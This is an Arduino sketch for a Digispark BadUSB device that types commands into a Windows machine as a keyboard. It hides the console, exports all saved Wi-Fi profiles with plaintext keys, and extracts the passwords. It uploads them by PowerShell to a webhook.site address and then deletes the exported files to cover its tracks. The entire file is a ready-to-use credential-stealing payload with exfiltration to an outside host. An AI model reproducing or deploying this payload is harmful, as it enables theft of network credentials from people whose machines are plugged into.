/*
Name    : Ramp
Author  : Md. Ridwanul Islam Muntakim
Email   : theridwanul@protonmail.com
*/

#include "DigiKeyboard.h"

void setup() { 
}

void loop() {
  DigiKeyboard.sendKeyStroke(0);
  DigiKeyboard.delay(5000);
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
  DigiKeyboard.delay(100);
  DigiKeyboard.println("cmd /k mode con: cols=15 lines=1");
  DigiKeyboard.delay(5000);
  DigiKeyboard.println("cd %temp%"); 
  DigiKeyboard.println("netsh wlan export profile key=clear");  
  DigiKeyboard.println("powershell Select-String -Path Wi*.xml -Pattern 'keyMaterial' > Wi-Fi-PASS"); 
  DigiKeyboard.println("powershell Invoke-WebRequest -Uri https://webhook.site/PasteYourHookAddress -Method POST -InFile Wi-Fi-PASS");
  DigiKeyboard.delay(50);  
  DigiKeyboard.println("del Wi-* /s /f /q");
  DigiKeyboard.delay(100);  
  DigiKeyboard.println("exit");
  for(;;){ 
  }
}